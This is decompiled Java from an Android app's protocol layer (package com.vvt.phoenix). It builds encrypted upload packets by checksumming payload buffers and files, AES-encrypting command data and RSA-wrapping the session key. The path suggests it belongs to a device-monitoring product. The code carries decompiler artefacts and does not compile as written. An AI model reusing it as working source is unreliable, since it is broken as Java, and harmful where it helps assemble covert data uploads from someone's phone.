package com.vvt.phoenix.prot.databuilder;

import android.os.ConditionVariable;
import android.os.Looper;
import com.vvt.l.f;
import com.vvt.l.g;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.zip.CRC32;
import javax.crypto.SecretKey;

public class t
  implements com.vvt.k.d
{
  private ConditionVariable a;
  private long b;
  private boolean c;
  private Exception d;
  
  private int a(s params)
  {
    int i = 0;
    Object localObject1 = null;
    Object localObject2 = params.a();
    PayloadType localPayloadType = PayloadType.BUFFER;
    if (localObject2 == localPayloadType)
    {
      params = (a)params;
      localObject1 = params.b();
    }
    long l1;
    for (int j = localObject1.length;; j = (int)l1)
    {
      return j;
      localObject2 = params.a();
      localPayloadType = PayloadType.FILE;
      if (localObject2 != localPayloadType) {
        break;
      }
      localObject1 = new java/io/File;
      params = (c)params;
      localObject2 = params.b();
      ((File)localObject1).<init>((String)localObject2);
      l1 = ((File)localObject1).length();
    }
    localObject2 = params.a();
    localPayloadType = PayloadType.VIRTUAL;
    if (localObject2 == localPayloadType)
    {
      params = (ao)params;
      int k = params.b().length + 0;
      ArrayList localArrayList = params.d();
      j = k;
      k = 0;
      localObject2 = null;
      for (;;)
      {
        i = localArrayList.size();
        if (k >= i) {
          break;
        }
        localObject1 = (com.vvt.phoenix.prot.b.c)localArrayList.get(k);
        int m = ((com.vvt.phoenix.prot.b.c)localObject1).a().length;
        j += m;
        File localFile = new java/io/File;
        localObject1 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
        localFile.<init>((String)localObject1);
        long l2 = localFile.length();
        i = (int)l2;
        j += i;
        i = k + 1;
        k = i;
      }
    }
    localObject1 = new java/lang/Exception;
    ((Exception)localObject1).<init>("UNKNOWN Payload Builder Response type");
    throw ((Throwable)localObject1);
  }
  
  private long a(ao paramao)
  {
    CRC32 localCRC32 = new java/util/zip/CRC32;
    localCRC32.<init>();
    int i = 10240;
    byte[] arrayOfByte1 = new byte[i];
    Object localObject1 = paramao.b();
    int j = paramao.b().length;
    localCRC32.update((byte[])localObject1, 0, j);
    ArrayList localArrayList = paramao.d();
    for (j = 0;; j = i)
    {
      i = localArrayList.size();
      if (j >= i) {
        break;
      }
      localObject1 = (com.vvt.phoenix.prot.b.c)localArrayList.get(j);
      Object localObject2 = ((com.vvt.phoenix.prot.b.c)localObject1).a();
      byte[] arrayOfByte2 = ((com.vvt.phoenix.prot.b.c)localObject1).a();
      int k = arrayOfByte2.length;
      localCRC32.update((byte[])localObject2, 0, k);
      localObject2 = new java/io/FileInputStream;
      localObject1 = ((com.vvt.phoenix.prot.b.c)localObject1).b();
      ((FileInputStream)localObject2).<init>((String)localObject1);
      for (i = ((FileInputStream)localObject2).read(arrayOfByte1);; i = ((FileInputStream)localObject2).read(arrayOfByte1))
      {
        k = -1;
        if (i == k) {
          break;
        }
        localCRC32.update(arrayOfByte1, 0, i);
      }
      ((FileInputStream)localObject2).close();
      i = j + 1;
    }
    return localCRC32.getValue();
  }
  
  public v a(com.vvt.phoenix.prot.b.a parama)
  {
    int i = 4;
    int j = 2;
    Object localObject1 = new com/vvt/phoenix/prot/command/d;
    ((com.vvt.phoenix.prot.command.d)localObject1).<init>();
    Object localObject2 = parama.d();
    ((com.vvt.phoenix.prot.command.d)localObject1).a((com.vvt.phoenix.prot.command.c)localObject2);
    ((com.vvt.phoenix.prot.command.d)localObject1).a(3);
    int k = (int)parama.h();
    ((com.vvt.phoenix.prot.command.d)localObject1).b(k);
    long l1 = parama.i();
    ((com.vvt.phoenix.prot.command.d)localObject1).a(l1);
    localObject1 = com.vvt.phoenix.prot.a.e.a((com.vvt.phoenix.prot.command.d)localObject1);
    localObject2 = com.vvt.l.e.a(parama.g());
    localObject1 = com.vvt.l.a.a((SecretKey)localObject2, (byte[])localObject1);
    long l2 = com.vvt.k.a.a((byte[])localObject1);
    int m = localObject1.length;
    Object localObject3 = g.a(parama.f());
    Object localObject4 = parama.g();
    localObject3 = f.a((RSAPublicKey)localObject3, (byte[])localObject4);
    localObject4 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject4).<init>();
    ((ByteArrayOutputStream)localObject4).write(1);
    long l3 = parama.b();
    byte[] arrayOfByte1 = com.vvt.phoenix.a.a.a((int)l3);
    ((ByteArrayOutputStream)localObject4).write(arrayOfByte1, 0, i);
    arrayOfByte1 = com.vvt.phoenix.a.a.a((short)localObject3.length);
    ((ByteArrayOutputStream)localObject4).write(arrayOfByte1, 0, j);
    int n = localObject3.length;
    ((ByteArrayOutputStream)localObject4).write((byte[])localObject3, 0, n);
    m = (short)m;
    byte[] arrayOfByte2 = com.vvt.phoenix.a.a.a(m);
    ((ByteArrayOutputStream)localObject4).write(arrayOfByte2, 0, j);
    byte[] arrayOfByte3 = com.vvt.phoenix.a.a.a((int)l2);
    ((ByteArrayOutputStream)localObject4).write(arrayOfByte3, 0, i);
    int i1 = localObject1.length;
    ((ByteArrayOutputStream)localObject4).write((byte[])localObject1, 0, i1);
    boolean bool = parama.j();
    if (bool)
    {
      localObject1 = new com/vvt/phoenix/prot/databuilder/ap;
      ((ap)localObject1).<init>();
      ((ap)localObject1).a((SecretKey)localObject2);
      localObject2 = ((ByteArrayOutputStream)localObject4).toByteArray();
      ((ap)localObject1).b((byte[])localObject2);
      l1 = parama.i();
      ((ap)localObject1).b(l1);
      l1 = parama.h();
      ((ap)localObject1).a(l1);
      com.vvt.io.d.a((OutputStream)localObject4);
      localObject2 = parama.k();
      ((ap)localObject1).a((byte[])localObject2);
      localObject2 = parama.l();
      ((ap)localObject1).a((ArrayList)localObject2);
    }
    for (;;)
    {
      return (v)localObject1;
      localObject1 = new com/vvt/phoenix/prot/databuilder/d;
      ((d)localObject1).<init>();
      ((d)localObject1).a((SecretKey)localObject2);
      localObject2 = ((ByteArrayOutputStream)localObject4).toByteArray();
      ((d)localObject1).b((byte[])localObject2);
      l1 = parama.i();
      ((d)localObject1).b(l1);
      l1 = parama.h();
      ((d)localObject1).a(l1);
      localObject2 = parama.c();
      ((d)localObject1).a((String)localObject2);
      com.vvt.io.d.a((OutputStream)localObject4);
    }
  }
  
  public v a(com.vvt.phoenix.prot.command.c paramc, com.vvt.phoenix.prot.command.b paramb, String paramString, byte[] paramArrayOfByte, long paramLong, int paramInt)
  {
    Object localObject1 = new android/os/ConditionVariable;
    ((ConditionVariable)localObject1).<init>();
    this.a = ((ConditionVariable)localObject1);
    int i = paramb.a();
    Object localObject2 = r.a(i).a(paramc, paramb, paramString, paramInt);
    Object localObject3 = new com/vvt/phoenix/prot/command/d;
    ((com.vvt.phoenix.prot.command.d)localObject3).<init>();
    ((com.vvt.phoenix.prot.command.d)localObject3).a(paramc);
    ((com.vvt.phoenix.prot.command.d)localObject3).a(paramInt);
    int j = a((s)localObject2);
    ((com.vvt.phoenix.prot.command.d)localObject3).b(j);
    localObject1 = ((s)localObject2).a();
    Object localObject4 = PayloadType.BUFFER;
    long l1;
    long l2;
    Object localObject6;
    Object localObject7;
    if (localObject1 == localObject4)
    {
      localObject1 = localObject2;
      localObject1 = ((a)localObject2).b();
      l1 = com.vvt.k.a.a((byte[])localObject1);
      ((com.vvt.phoenix.prot.command.d)localObject3).a(l1);
      localObject1 = com.vvt.phoenix.prot.a.e.a((com.vvt.phoenix.prot.command.d)localObject3);
      localObject1 = com.vvt.l.a.a(((s)localObject2).c(), (byte[])localObject1);
      l2 = com.vvt.k.a.a((byte[])localObject1);
      int k = localObject1.length;
      Object localObject5 = g.a(paramArrayOfByte);
      localObject6 = ((s)localObject2).c().getEncoded();
      localObject5 = f.a((RSAPublicKey)localObject5, (byte[])localObject6);
      localObject6 = new java/io/ByteArrayOutputStream;
      ((ByteArrayOutputStream)localObject6).<init>();
      ((ByteArrayOutputStream)localObject6).write(1);
      byte[] arrayOfByte = com.vvt.phoenix.a.a.a((int)paramLong);
      ((ByteArrayOutputStream)localObject6).write(arrayOfByte, 0, 4);
      arrayOfByte = com.vvt.phoenix.a.a.a((short)localObject5.length);
      int m = 2;
      ((ByteArrayOutputStream)localObject6).write(arrayOfByte, 0, m);
      arrayOfByte = null;
      int n = localObject5.length;
      ((ByteArrayOutputStream)localObject6).write((byte[])localObject5, 0, n);
      localObject3 = com.vvt.phoenix.a.a.a((short)k);
      localObject5 = null;
      int i1 = 2;
      ((ByteArrayOutputStream)localObject6).write((byte[])localObject3, 0, i1);
      localObject3 = com.vvt.phoenix.a.a.a((int)l2);
      int i2 = 4;
      ((ByteArrayOutputStream)localObject6).write((byte[])localObject3, 0, i2);
      k = 0;
      int i3 = localObject1.length;
      ((ByteArrayOutputStream)localObject6).write((byte[])localObject1, 0, i3);
      i = 0;
      localObject1 = null;
      localObject3 = ((s)localObject2).a();
      localObject7 = PayloadType.BUFFER;
      if (localObject3 != localObject7) {
        break label610;
      }
      localObject3 = new com/vvt/phoenix/prot/databuilder/b;
      ((b)localObject3).<init>();
      localObject1 = localObject2;
      localObject1 = ((a)localObject2).b();
      ((b)localObject3).a((byte[])localObject1);
      localObject1 = localObject3;
    }
    for (;;)
    {
      localObject2 = ((s)localObject2).c();
      ((v)localObject1).a((SecretKey)localObject2);
      localObject2 = ((ByteArrayOutputStream)localObject6).toByteArray();
      ((v)localObject1).b((byte[])localObject2);
      com.vvt.io.d.a((OutputStream)localObject6);
      ((v)localObject1).b(l1);
      long l3 = j;
      ((v)localObject1).a(l3);
      return (v)localObject1;
      localObject1 = ((s)localObject2).a();
      localObject4 = PayloadType.FILE;
      if (localObject1 == localObject4)
      {
        localObject1 = localObject2;
        localObject1 = ((c)localObject2).b();
        localObject4 = new com/vvt/phoenix/prot/databuilder/u;
        ((u)localObject4).<init>(this, (String)localObject1);
        ((Thread)localObject4).setPriority(1);
        ((Thread)localObject4).start();
        this.a.block();
        localObject1 = this.a;
        ((ConditionVariable)localObject1).close();
        boolean bool = this.c;
        if (!bool) {
          throw this.d;
        }
        l1 = this.b;
        l2 = this.b;
        ((com.vvt.phoenix.prot.command.d)localObject3).a(l2);
        break;
      }
      localObject1 = ((s)localObject2).a();
      localObject4 = PayloadType.VIRTUAL;
      if (localObject1 == localObject4)
      {
        localObject1 = localObject2;
        localObject1 = (ao)localObject2;
        l1 = a((ao)localObject1);
        ((com.vvt.phoenix.prot.command.d)localObject3).a(l1);
        break;
      }
      localObject1 = new java/lang/Exception;
      ((Exception)localObject1).<init>("UNKNOWN Payload Builder Response type");
      throw ((Throwable)localObject1);
      label610:
      localObject3 = ((s)localObject2).a();
      localObject7 = PayloadType.FILE;
      if (localObject3 == localObject7)
      {
        localObject3 = new com/vvt/phoenix/prot/databuilder/d;
        ((d)localObject3).<init>();
        localObject1 = localObject2;
        localObject1 = ((c)localObject2).b();
        ((d)localObject3).a((String)localObject1);
        localObject1 = localObject3;
      }
      else
      {
        localObject3 = ((s)localObject2).a();
        localObject7 = PayloadType.VIRTUAL;
        if (localObject3 == localObject7)
        {
          localObject1 = localObject2;
          localObject1 = (ao)localObject2;
          localObject3 = new com/vvt/phoenix/prot/databuilder/ap;
          ((ap)localObject3).<init>();
          localObject7 = ((ao)localObject1).b();
          ((ap)localObject3).a((byte[])localObject7);
          localObject1 = ((ao)localObject1).d();
          ((ap)localObject3).a((ArrayList)localObject1);
          localObject1 = localObject3;
        }
      }
    }
  }
  
  public void a(long paramLong)
  {
    boolean bool = true;
    this.c = bool;
    this.b = paramLong;
    this.a.open();
    Looper localLooper = Looper.myLooper();
    if (localLooper != null) {
      localLooper.quit();
    }
  }
  
  public void a(Exception paramException)
  {
    this.c = false;
    this.d = paramException;
    this.a.open();
    Looper localLooper = Looper.myLooper();
    if (localLooper != null) {
      localLooper.quit();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/t.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */